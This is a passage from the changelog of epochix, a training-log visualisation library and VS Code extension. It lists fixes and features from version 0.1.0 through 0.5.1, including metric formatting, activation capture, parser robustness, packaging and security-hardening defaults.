  gaze (MAE), NLP (perplexity): every displayed value equals the logged value
  exactly (no fabrication) and epoch 1 is present.

---

## [0.5.1] — 2026-07-11

### Fixed — the primary metric is not always accuracy

- **The stat row, learning meter, and central learning-curve chart assumed the
  primary metric was a 0–1 accuracy and multiplied it by 100 with a "%".** On a
  regression/gaze run, where the primary metric is MAE/RMSE/loss (raw units),
  this rendered nonsense — e.g. **MAE ≈ 7 shown as "Accuracy: 700%"**, the meter
  pinned at "100%", and the learning-curve line flat-lined against the top of
  the chart (raw MAE clamped into [0,1]) under meaningless accuracy grade lines.
- The primary metric is now formatted by its **actual type**: accuracy-style
  metrics (accuracy, mAP, mAP50, F1, AUC, …) still read as a percentage; error
  and loss metrics show their **raw value** with the correct label (MAE, RMSE,
  perplexity, …) — never a percentage. The stat chip and tooltips use the real
  metric name instead of a hardcoded "Accuracy".
- The central learning-curve chart maps error/loss metrics into its 0–1 quality
  space over the observed data range (oriented so *better* rises) and hides the
  accuracy-only grade lines when they don't apply. The improvement-burst effect
  now respects metric direction, so it no longer celebrates a rising MAE.
- Verified end-to-end across tasks: gaze (MAE → "5.88"), classification
  (val_accuracy → "42.0%"), detection (mAP50 → "31.0%"). Adds a viz-util test.

---

## [0.5.0] — 2026-07-10

### Added — real activations, no `Math.random()`

- **`LiveReporter(model=…, capture_activations=True)`** captures **real**
  per-layer activation magnitudes (mean `|activation|`), dead/zero-unit
  fractions, and — via backward hooks — mean `|gradient|`, live from the model
  during training. The Network State panel's node brightness and dead nodes are
  now driven by these measured values instead of a random number. Hooks attach
  to exactly the parameter-bearing modules the architecture draws, so the
  captured values line up 1:1 with the layers on screen. Verified end-to-end on
  a real GazeCapture GPU run: seven layers captured, magnitudes and the
  vanishing-gradient signature (deep→shallow gradient decay) match the trained
  model, with negligible training overhead.
- **Opt-in and zero-overhead by default.** Capture is off unless you ask for it.
  When on, sampling is **wall-clock throttled** (`activation_hz`, 2 Hz default)
  because `.item()` forces a GPU→CPU sync — this keeps the impact rounding to
  zero. Hooks are fail-open (an exception disables the hook, never breaks the
  forward/backward pass), capture only in `model.training` mode, self-remove on
  `finish()`, and support both PyTorch and Keras.
- New `activations` WebSocket message + persistence of the latest snapshot in
  `run.config["activations"]`, so a dashboard opened mid- or post-run shows the
  real values too, not just live subscribers.

### Changed — honesty

- The Network State legend is now conditional: **"nodes: live activations ·
  edges: schematic"** when real activations are being captured, vs the previous
  *"schematic · illustrative, not measured weights"* otherwise. Edges (weights)
  stay schematic either way — they aren't cheaply forward-pass observable — and
  the legend keeps saying so, so the panel never claims "live" when it isn't.

---

## [0.4.0] — 2026-07-09

### Added — real architecture, no placeholder

- **`LiveReporter(model=…)`** captures the **real** architecture of the model
  you're training (PyTorch `nn.Module` or Keras `Model`) — actual layer names,
  types and parameter counts — and shows it in the dashboard's Network State
  panel. Verified the extracted parameter counts sum exactly to the model
  total across MLP / ResNet / ViT. Introspection never raises: if a model
  can't be read, the panel shows the honest empty state below rather than
  guessing.

### Changed — honesty

- **The Network State panel no longer fabricates an architecture.** Previously,
  when no model summary was available (e.g. any SDK run), it drew a made-up
  `INPUT → H1 → H2 → OUTPUT` diagram whose depth was invented from the training
  phase. It now renders an honest *"No architecture to display — pass model=…
  to LiveReporter, or include a model summary in the log"* message. Real
  architecture (from `model=` or a detected log summary) is drawn as before.
  (The animated activation/edge flow remains labelled *schematic — illustrative,
  not measured weights*, since live per-neuron values aren't captured.)

---

## [0.3.8] — 2026-07-09

### Fixed

- **Skill-radar "Fitting" and "Generalisation" axes were pinned to 0 on any
  run whose loss exceeded 1.0** (i.e. most real runs — MSE regression, gaze,
  detection). They inverted the raw loss against a fixed `scale=1.0`, so a
  loss of 16 gave `1 − 16 = 0`, leaving two of the radar's axes flat at zero.
  They are now **scale-relative**: Fitting = fraction of training loss reduced
  from the first epoch; Generalisation = how closely val loss tracks train
  loss (1.0 = no gap). Verified with real MLP / ResNet-CNN / ViT-Transformer
  gaze runs — the radar now distinguishes architectures (e.g. an overfitting
  MLP scores lower Generalisation than a ViT).

### Verified

- Real GPU training across architectures (MLP, ResNet-CNN, ViT-Transformer)
  and task types (gaze regression, 4-class + binary classification): task
  detection, primary metric, learning-curve values, loss charts, overfit gap
  and grades all match the logged metrics exactly.

---

## [0.3.7] — 2026-07-09

### Fixed

Hardening across all task types (found by probing each through the pipeline —
same bug classes as the gaze fixes, other tasks):

- **Runs that log a valid *alternative* metric for their task showed few/no
  frames and a bogus grade.** Each task had a single hard-coded primary metric
  (regression → MAE, detection → mAP50, nlp → perplexity), so a run logging
  RMSE-not-MAE, mAP-not-mAP50, or bleu-not-perplexity matched nothing. The
  engine now drives off the highest-priority task metric that is actually
  logged, falling back through a per-task candidate list.
- **`MSE`-only regression runs were classified as `custom`** — the regression
  task signal was `{MAE, RMSE}`; `MSE` is now included.
- Confirmed all seven task types + `val_`/`eval_`/`test_`-prefixed signal
  metrics (`val_map50`, `eval_accuracy`, `val_eer`, `test_perplexity`, …)
  resolve to the right task and produce frames.

---

## [0.3.6] — 2026-07-09

### Fixed

- **Live dashboard stayed on "Waiting for training data" for the whole run.**
  The pipeline buffered up to `SNIFF_SAMPLE_LINES` (200) lines before selecting
  a parser and emitting anything — meant to skip YOLO's verbose preamble in
  batch mode, but it also meant any live run shorter than 200 log lines (i.e.
  almost all of them) produced no frames until `finish()`. Live mode now
  detects an **idle gap** between epochs (the producer pausing to train) and
  sniffs on what it has, so frames stream in as each epoch completes. Batch
  file reads never pause, so their full-window detection is unchanged. Verified
  both: a slow-epoch gaze run shows frames live; the YOLO demo still detects as
  detection.

---

## [0.3.5] — 2026-07-09

### Fixed

- **SDK runs with an explicit raw `primary_metric` produced no story frames**
  (dashboard showed only the architecture). Metric events are stored under
  canonical keys (`MAE`), but a caller-supplied `primary_metric="val_mae_cm"`
  was compared against them verbatim, so no event ever matched the primary key
  and zero frames emitted. The primary metric is now canonicalised the same
  way events are (`val_mae_cm` → `MAE`), so
  `LiveReporter(task="gaze", primary_metric="val_mae_cm")` renders the full
  dashboard. Workaround on older versions: drop the `primary_metric` argument
  (the task already implies it) or pass the canonical name (`"mae"`).

---

## [0.3.4] — 2026-07-09

### Fixed

- **Regression/gaze runs showed only the architecture — no metrics, grade,
  or narrative.** Two bugs:
  1. The normalizer only matched exact metric spellings, so `val_mae_cm`
     (and `val_mae`, `mae_cm`, `val_rmse_deg`, …) fell through to `custom`.
     It now strips `val_`/`train_` prefixes and unit suffixes
     (`_cm`, `_deg`, `_mm`, …) to recover the base metric.
  2. Task type was locked at exactly the 3rd metric event, so a signal
     metric (MAE) arriving after noise keys (param counts logged as
     `custom`) or after the losses was never seen — the run stuck on
     `custom`. Detection now keeps classifying until a definite task
     emerges. A `train_loss=… val_loss=… val_mae_cm=…` gaze log now
     correctly resolves to task **gaze**, primary metric **MAE**, and a
     realistic grade instead of a bogus A+.

---

## [0.3.3] — 2026-07-09

### Fixed — CRITICAL

- **The published wheel shipped with no dashboard UI.** `pip install epochix`
  then `epochix serve` served an API only; opening the dashboard returned
  `{"detail":"Not Found"}`. Cause: CI ran `uv build`, which builds the wheel
  from an intermediate **sdist** that omits the force-included frontend bundle
  (those files are untracked), so only a `.gitkeep` placeholder shipped.
  Now builds the wheel **directly from source** (`uv build --wheel`), and a CI
  guard fails the release if `epochix/_frontend/dist/index.html` is ever
  missing from the wheel. Affected 0.3.0–0.3.2; fixed here.

### Changed

- Release build is single-OS (pure-Python `py3-none-any`) and the PyPI
  publish auto-retries once after a short wait (PyPI's upload backend
  intermittently 5xx's on the first attempt).

---

## [0.3.2] — 2026-07-08

Fixes the VS Code extension's sidecar detection and a repeated install prompt.

### Fixed

- **"Install epochix" prompt reappeared on every launch**, even with the
  package installed. It now shows at most once (dismissal is remembered), and
  never once the sidecar is detected. Adds a "Use standalone" action that sets
  `epochix.useSidecar: never`.
- **Sidecar never started even when epochix *was* installed** — two bugs:
  1. Detection relied solely on the `epochix` executable being on `PATH`,
     which pip often doesn't do (notably Windows `…\Scripts`). It now falls
     back to `python -m epochix` when the script isn't on `PATH` but Python is.
  2. The extension spawned `serve --no-browser --locale <x>`, but `serve`
     accepts neither flag, so the process exited immediately. Removed them
     (`serve` never opens a browser; the webview sets its own locale).
- **`python -m epochix`** now works — added `epochix/__main__.py` (the
  extension's fallback relies on it).

### Notes

- Already-installed users on Windows can also point `epochix.sidecarPath` at
  `…\Scripts\epochix.exe`, or add that folder to `PATH`.

---

## [0.3.1] — 2026-07-08

First patch after the initial public release.

### Fixed

- **Extension "install sidecar" link 404'd** — pointed at the wrong GitHub
  org with a non-existent anchor; now `github.com/epochix-dev/epochix#install`.
- **Broken logo on the PyPI and VS Code Marketplace pages** — both render the
  README on their own site, where relative image paths don't resolve. The
  header logo now uses an absolute `raw.githubusercontent.com` URL (main
  README and the extension README).
- **Open VSX publish** — the release workflow now runs `ovsx create-namespace`
  before `ovsx publish` (the namespace is not auto-created), so the extension
  reaches Open VSX alongside the VS Code Marketplace.
- **`vsce package` in CI** — install the frontend's dependencies in the
  packaging job; the `vscode:prepublish` hook rebuilds the webview with vite.
- **`npm version` in the release workflow** — pass `--allow-same-version`
  (the committed manifest already sits at the tag's version).

---

## [0.3.0] — 2026-05-27

### Renamed — `model-story` → `epochix`

The PyPI name `model-story` was already taken, so the project ships under
**`epochix`** from this release onward. This is a one-time, breaking rename
done before any public PyPI / VS Code Marketplace listing — there is no
deprecation alias because there are no v0.1 / v0.2 installs in the wild.

**Migration (none expected in practice):**

| Was                                       | Is                                    |
|-------------------------------------------|---------------------------------------|
| `pip install model-story`                 | `pip install epochix`                 |
| `model-story <log>`                       | `epochix <log>`                       |
| `from model_story.* import …`             | `from epochix.* import …`             |
| `MODEL_STORY_*` env vars                  | `EPOCHIX_*`                           |
| `~/.model-story/runs.db`                  | `~/.epochix/runs.db`                  |
| `.model-story.yaml` (project config)      | `.epochix.yaml`                       |
| `@model-story/web` (frontend pkg)         | `@epochix/web`                        |
| VS Code: `model-story.*` commands         | `epochix.*`                           |
| VS Code: `modelStory.*` settings          | `epochix.*`                           |

### Brand

- New mark and app icon shipping in `asset/` (`epochix_mark_*.png`,
  `epochix_appicon_*.png`).
- VS Code extension icon updated to the Epochix appicon.

### Security hardening (pre-publication audit)

- **Security headers** on every server response: `X-Content-Type-Options:
  nosniff` and `Referrer-Policy: no-referrer`. Deliberately *no*
  `X-Frame-Options` / `frame-ancestors` — the VS Code sidecar embeds the
  dashboard in a webview `<iframe>`, which framing restrictions would break.
- **`run_id` charset constrained** (`[A-Za-z0-9_.-]`, ≤64) on
  `POST /api/runs` — client-supplied ids are echoed into
  `Content-Disposition` filenames by the export routes.
- **`GET /api/runs?limit=` capped** at 1000 (was unbounded).
- **`/api/version` and the OpenAPI version** now report the real installed
  version (was hard-coded `0.1.0`).
- Dependency audits clean: `pip-audit` finds no vulnerabilities in runtime
  deps; `npm audit` clean for the frontend and extension prod trees.

### UI

- **Favicon** — the Epochix mark ships as an inline data-URI icon (1 KB),
  so it works identically in live serve, the standalone HTML export and
  the VS Code webview; `/favicon.png` is also emitted for static hosts.
- `<meta name="description">` and `<meta name="theme-color">` added to the
  dashboard document head.

### Release engineering

- **`package-lock.json` files resynced** (frontend + extension) — both
  locks were still at v0.1.0, so `npm ci` failed on any clean checkout,
  which would have broken every CI/release workflow on first push.
- **Docker distribution removed.** Epochix ships as exactly two things: a
  Python library (PyPI) and a VS Code extension (Marketplace / Open VSX).
  The Dockerfile, `docker-compose.yml` (which referenced a never-built
  Redis/Postgres "hosted mode") and the GHCR publish job were scaffold-era
  scope; `pip install epochix && epochix serve` covers the shared-server
  use-case, and the SSH ingester covers remote training boxes.
- **Docs pipeline**: new `docs` extra (`mkdocs-material` + `mkdocstrings`,
  `mkdocs` pinned `<2`) and a `docs.yml` workflow that builds with
  `--strict` on PRs and deploys to GitHub Pages from `main`. Fixed a
  broken `api.md` link in the docs and added the missing **Python SDK
  reference** page (mkdocstrings-rendered).
- **JSON export deduplicated** — the canonical run payload was built
  inline in three places (HTTP route, SDK, HTML export embed); all now
  share `exporters/json_export.build_json[_payload]` (previously a dead
  `NotImplementedError` stub).
- Internal phase jargon ("Phase 11", "Phase 5") scrubbed from API error
  messages and OpenAPI docstrings.
- Copyright lines unified to "2026 Epochix Team" (LICENSE appendices, docs
  footer, README and package metadata disagreed with each other).

---

## [0.2.0] — 2026-05-26

A reliability + correctness release. Every section below covers a real bug
caught by running the system against a real YOLOv8n training run on an RTX
5080 (real GazeCapture eye-detection dataset, 30 epochs, mAP50 0.870).

### Security — secure-by-default

- **CORS lockdown** — default `EPOCHIX_CORS_ORIGINS` is now empty
  (same-origin only). Browser SOP protects the local dashboard from
  drive-by reads/writes by other tabs the user has open. The wildcard `*`
  is still available for explicit opt-in.
- **Write/delete endpoints gated** by `require_destructive` — when no
  `AUTH_TOKEN` is set, only loopback callers can DELETE runs, create runs,
  or push metric events. Remote writes always require a `Bearer` token.
- **API docs hidden by default** — `/api/docs` / `/api/redoc` /
  `/api/openapi.json` are not exposed unless `auth_token` is configured
  or `EPOCHIX_EXPOSE_DOCS=1` is set.
- **CLI warns** when binding `--host 0.0.0.0` without an auth token.
- **Field length caps** on `EventPushRequest` / `RunCreateRequest`.

### Scientific correctness

- **Percentage metrics normalised to [0, 1] at ingest** — accuracy logged
  as `87.6` is now stored as `0.876`. Grade thresholds / radar / cards
  all relied on this implicitly but it was never enforced.
- **Direction-aware phase detection** — `compute_phase()` takes a
  `lower_better` flag and computes relative improvement against the
  metric's real ideal. Loss-only runs no longer stall in Learning. When
  `total_epochs` is unknown the engine advances on real improvement.
- **Honest "Maturity"** — legacy `confidence = min(progress*2, 1)` was
  just training progress doubled, rendered under a "Confidence" label.
  Now carries an honest advancement scalar; UI relabelled to "Maturity".
- **BrainCanvas overfit halo** uses the real train/val gap from
  `skill_dimensions`, not the bogus progress proxy.
- **Network State weight edges** clearly labelled as schematic /
  illustrative, not measured weights.
- **Convergence threshold** is now scale-relative (slope ÷ series scale).
- **Skill radar caveat** — axes are correlated; shape is rhetorical.

### Parser robustness

- **ANSI escape codes stripped** before parsing. Ultralytics / Lightning /
  rich / tqdm emit `\x1b[K` + colour codes when stdout is piped — these
  landed at column 0 of training rows and broke the regex parsers.
- **Sniff window 50 → 200** so verbose preambles (model summary + AMP
  checks + dataset scan) don't bury the first training row.
- **`parser_used` / `task_type` / `primary_metric` persisted** after
  auto-detection (was only updated in memory, never written to the DB).
- **Live architecture detection** — fires inside the ingestion loop as
  soon as the header window fills, and broadcasts an `architecture` WS
  message so the Network State populates *during* live training (was
  only visible after the run finished).

### New features

- **`epochix demo` subcommand** — three bundled logs (`seq2seq`,
  `yolov8`, `keras`) ship in the wheel. One-command first-run experience.
- **`--ssh user@host:/path` ingester** — first-class SSH support. Spawns
  `ssh -o BatchMode=yes -o ServerAliveInterval=30 host 'tail -F -n +0
  <quoted-path>'` under the hood. Inherits `~/.ssh/config`, agent, keys;
  never sees passwords. Flags: `--ssh`, `--ssh-port`, `--ssh-identity`,
  `--ssh-opt`.
- **Engineer panel**: LR-schedule chart (log-y, auto-hidden when absent),
  multi-loss decomposition (box/cls/dfl overlaid for YOLO), best-epoch
  ★ markers on val curves.
- **Live Metrics** — TensorBoard-style scalar cards (value · ▲/▼ delta ·
  gradient sparkline) replaced the old horizontal bars.
- **Task-aware Skill Radar** — detection: mAP50, mAP50-95, Precision,
  Recall, Localisation; biometric: 1−EER, TAR, TAR@FAR=1e-3; gaze +
  regression: 1−MAE, 1−RMSE; NLP: 1−Perplexity, BLEU, ROUGE.
- **Distributions panel** — value histograms alongside existing
  parameter-share and metric box-summaries.
- **Engineer panel detection fallbacks** — Loss chart synthesises
  `train loss = box+cls+dfl`; Accuracy chart uses mAP50 + mAP50-95;
  Overfitting Gap falls back to `precision − recall`.
- **Network State**: architecture chip compacts adjacent duplicate
  layer types (`Conv ×2 + C2f + …`); per-zone labels truncate with
  shorter aliases (`Pattern finder → Patterns`).
- **Multi-run comparison** at `/compare` with metric picker + EMA + legend.
- **Educational panel** ("In Plain English") — grade journey + "X in 10
  right" meter + practice-vs-test analogy. Direction inferred from data.
- **Training Diagnostics** — health gauge + overfit / convergence /
  stability / generalisation cards with status chips.
- **Phase Journey ribbon** — per-phase grade chips + connectors.

### VS Code extension

- **Reproducible packaging** — `vite.webview.config.js` produces flat
  `main.js` + `main.css` (Chart.js inlined for the strict CSP).
  `vscode:prepublish` rebuilds the shared frontend so `vsce package`
  is hermetic. `.vsix` is 124 KB clean.
- **Loader reads the built `index.html`** so the full app markup ships
  in the webview (was a bare `<div id=app>` before).
- **Frontend postMessage bridge** — gated on `window.__EPOCHIX_VSCODE__`;
  Standalone mode receives `init`/`frame`/`milestone`/`warning`/
  `complete`/`themeChange` from the StoryEngine.
- Extension now carries a **128×128 icon**, **LICENSE**, **README**, and
  **CHANGELOG** inside the `.vsix`. `.vscodeignore` excludes `**/*.map`.

### UX

- README quickstart now begins with `epochix demo` — newcomers see
  a populated dashboard in one command.
- Engineer accuracy fallback labels are honest (`mAP50` / `mAP50-95`,
  not the misleading "val acc").
- Network State weight legend moved out of the canvas into its own row
  so 3D slab top faces can't overlap it.

### Tests + tooling

- **+58 new tests**: 11 end-to-end fresh-install pipeline tests covering
  every model family (PL / Keras / HuggingFace / YOLOv8 / seq2seq /
  fingerprint / gaze) + a synthesised 50-epoch trajectory + HTTP-API
  smoke + `/api/compare` + `cmd_demo`; 16 SSH ingester tests (mocked
  subprocess, no real SSH needed); 9 security tests (CORS posture, docs
  visibility, loopback-vs-remote write gating); +2 phase tests + 3
  normalizer percent tests.
- **322 Python tests + 50 JS tests** passing on Python 3.13 / 3.14.
- **ruff + mypy --strict clean**.
- New classifiers: `Python :: 3.13`, `Topic :: Scientific/Engineering ::
  Visualization`, `Framework :: FastAPI`, `Typing :: Typed`,
  `Operating System :: OS Independent`.

### Fixed

- Stale `epochix batch training.log` in the README — there was no
  `batch` subcommand. Corrected to the implicit-default shorthand.
- `LearningMeter` docstring was stale.
- VS Code `.vscodeignore` `*.map` pattern only matched the root; bumped
  to `**/*.map`.

---

## [0.1.0] — 2026-05-22

First public release.

### Added

#### Core library
- **7 log parsers** — PyTorch Lightning, Keras/TensorFlow, HuggingFace Trainer, Ultralytics YOLO,
  FastAI, Accelerate, and a Universal fallback that handles arbitrary `key=value` / `key: value`
  and JSON-fragment lines
- **Normalizer** — maps 80+ raw metric spellings to a canonical key set
  (`val_accuracy`, `train_loss`, `mAP50`, `EER`, `MAE`, `perplexity`, `fid`, …)
- **LLM fallback parser** — optional Ollama/OpenAI/Anthropic integration for unknown formats
- **Plugin system** — four entry-point groups: `epochix.parsers`, `epochix.metaphor_packs`,
  `epochix.tasks`, `epochix.exporters`; third-party packages can extend any of them

#### Story engine
- **5 training phases** — Awakening → Learning → Understanding → Mastering → Polishing
- **11 letter grades** — A+ through F, with per-task thresholds for 7 task types
- **`.epochix.yaml` config** — override grade thresholds and lower-is-better direction
  per task type; file is discovered by walking up the directory tree
- **Task auto-detection** — classifies task type after ≥ 3 events from the metric key set
- **Narrative templates** — 50 English templates (7 tasks × 5 phases, 4 variants each);
  Farsi and French locales for all 7 task types (60 additional files)
- **8 milestone kinds** — first metric, best val, improvement streak, plateau, overfit,
  divergence, training complete, custom
- **Warning detector** — overfitting, plateau, divergence signals emitted as `WSMessage`
- **Skill radar dimensions** — accuracy, val_accuracy, fitting, generalisation from metric history

#### Server and streaming
- **FastAPI server** — `POST /api/runs`, `POST /api/runs/{id}/event`, `GET /api/snapshot/{id}`,
  `GET /api/metrics/{id}`, `GET /api/export/{id}/{format}`
- **WebSocket** (`/ws/live/{id}?last_seq=N`) — per-run pub/sub with ring-buffer replay
  (ring-buffer size 2048, replay any messages with seq > last_seq on reconnect)
- **SSE** (`/sse/live/{id}`) — Server-Sent Events alternative for environments that block WS

#### CLI (`epochix …`)
- `batch` — parse a log file and print the story
- `live` — pipe stdin through the story engine in real time
- `serve` — start the local server + dashboard
- `list` — show all saved runs
- `open` — open dashboard in browser
- `export` — export a run to JSON / Markdown / HTML / PDF
- `compare` — side-by-side grade comparison of two runs
- `prune` — delete old runs by age or count
- `config` — show / set configuration
- `import-tensorboard` — ingest TensorBoard event files
- `import-wandb` — ingest Weights & Biases run history

#### Python SDK
- `LiveReporter` — drop-in callback for PyTorch Lightning, HuggingFace Trainer, Keras, Accelerate
- `parse(path)` / `parse_string(text)` — parse a log file / string into a `StoryResult`
- `compare(run_a, run_b)` — return a `ComparisonReport`
- `visualize(run)` — open the dashboard for a run
- `export(run, format, path)` — export programmatically
- `@story` decorator — wrap any training function; auto-creates a run

#### Frontend (Vite 5, 86 KB gzipped)
- **BrainCanvas** — Canvas 2D animated neural network (phase-aware colours + pulse)
- **GradeCard** — large animated letter grade with phase label
- **TimelineStory** — scrollable epoch timeline with milestone chips
- **SkillRadar** — D3 radar chart for skill dimensions
- **LearningMeter** — progress bar with phase transitions
- **ConfidenceBars** — stacked bar chart for per-metric confidence
- **EpochScrubber** — drag to replay any past epoch
- **ImprovementWaterfall** — delta chart for consecutive frames
- **ParticleField** — ambient background particle animation
- **Themes** — dark / light (follows OS preference)
- **i18n** — English, Farsi (RTL), French

#### Exporters
- **JSON** — full run + events + frames, round-trip importable via `Run.model_validate()`
- **Markdown** — GitHub-flavoured narrative report with grade table
- **HTML** — self-contained single-file export (< 2 MB) with embedded dashboard
- **PDF** — WeasyPrint-based PDF (optional `pdf` extra)

#### Integrations
- **PyTorch Lightning** — `EpochixCallback`
- **HuggingFace Transformers** — `EpochixCallback` for `Trainer`
- **Jupyter** — `%load_ext epochix`, `%epochix`, `%%epochix` magics
- **TensorBoard** — `import-tensorboard` CLI command
- **Weights & Biases** — `import-wandb` CLI command

#### VS Code extension
- Standalone mode: parses the active terminal log live in the editor
- Sidecar mode: connects to a running `epochix serve` instance
- `Epochix Runs` tree view in the Explorer panel
- `Ctrl+Alt+M` / `Cmd+Alt+M` — open dashboard panel
- Configurable task hint, theme, locale

#### Infrastructure
- **GitHub Actions CI** — lint, typecheck, pytest (3 OS × 3 Python versions), Vitest, E2E, Lighthouse
- **GitHub Actions Release** — wheel (3 OS), PyPI OIDC publish, SBOM (CycloneDX), Docker GHCR
- **GitHub Actions VS Code Release** — `.vsix` build, VS Code Marketplace publish, Open VSX publish
- **Docker image** — `ghcr.io/epochix/server:<version>`, multi-stage Vite + Python 3.12-slim
- **Claude Artifact** — 1 198-line single-file React JSX usable directly in Claude

#### Quality
- **244 Python tests** — unit + integration (pytest, Hypothesis 2000-example fuzz on all 7 parsers)
- **50 JavaScript tests** — store.js 100% coverage, ws-client.js 96% (Vitest + jsdom)
- **mypy --strict** — 0 errors on 67 source files
- **ruff** — 0 errors

[Unreleased]: https://github.com/epochix-dev/epochix/compare/v0.3.0...HEAD
[0.3.0]: https://github.com/epochix-dev/epochix/releases/tag/v0.3.0
[0.2.0]: https://github.com/epochix-dev/epochix/releases/tag/v0.2.0
[0.1.0]: https://github.com/epochix-dev/epochix/releases/tag/v0.1.0
